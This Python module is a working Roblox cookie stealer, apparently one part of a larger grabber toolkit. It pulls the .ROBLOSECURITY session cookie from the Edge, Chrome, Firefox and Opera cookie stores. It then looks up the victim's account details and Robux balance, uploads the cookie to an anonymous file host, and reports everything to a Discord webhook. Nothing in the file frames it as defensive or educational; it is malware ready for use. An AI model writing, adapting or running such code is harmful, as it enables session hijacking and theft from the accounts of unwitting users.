import threading 
import requests
import browser_cookie3
from config import Config
from json import dumps
import dhooks
from __webhook import _WebhookX
import random 
import string
from anonFile import uploadToAnonfiles
import os


cc = Config()
wh_avatar = cc.get_avatar()
wh_name = cc.get_name()
eb_color = cc.get_color()
eb_footer = cc.get_footer()

class RobloxX():
    def __init__(self):
        self.web = _WebhookX().get_object()

    def UploadRobloxCookie(self, roblox_cookie):
        headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
        info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
        print(info)

        name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
        with open(name, 'w+') as f:
            f.write(roblox_cookie)

        link = uploadToAnonfiles(name)
        os.remove(name)

        embed = dhooks.Embed(
            description='Roblox Cookie Grabber:',
            color=13395456,
            timestamp='now'
        )


        embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())

        embed.add_field(name="User ID:", value=f'`{info["UserID"]}`')
        embed.add_field(name="Username:", value=f'`{info["UserName"]}`')
        embed.add_field(name="Robux Balance:", value=f'`{info["RobuxBalance"]}`')
        embed.add_field(name="IsPremium:", value=f'`{info["IsPremium"]}`')
        embed.add_field(name='ROBLOSECURITY:', value=f'[link]({link})')
        embed.set_image(info['ThumbnailUrl'])

        self.web.send(embed=embed)

    def MicrosoftEdge(self):
        try:
            cookies = browser_cookie3.edge(domain_name = "roblox.com")
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            self.UploadRobloxCookie(cookie)
        except Exception as e:
            print(e)

    def GoogleChrome(self):
        try:
            cookies = browser_cookie3.chrome(domain_name = "roblox.com")
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            self.UploadRobloxCookie(cookie)
        except Exception as e:
            print(e)

    def MozillaFirefox(self):
        try:
            cookies = browser_cookie3.firefox(domain_name = "roblox.com")
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            self.UploadRobloxCookie(cookie)
        except Exception as e:
            print(e)

    def Opera(self):
        try:
            cookies = browser_cookie3.opera(domain_name = "roblox.com")
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            self.UploadRobloxCookie(cookie)
        except Exception as e:
            print(e)

    def run(self):
        browsers = [self.MicrosoftEdge, self.GoogleChrome, self.MozillaFirefox, self.Opera]

        for v in browsers:
            threading.Thread(target = v).start()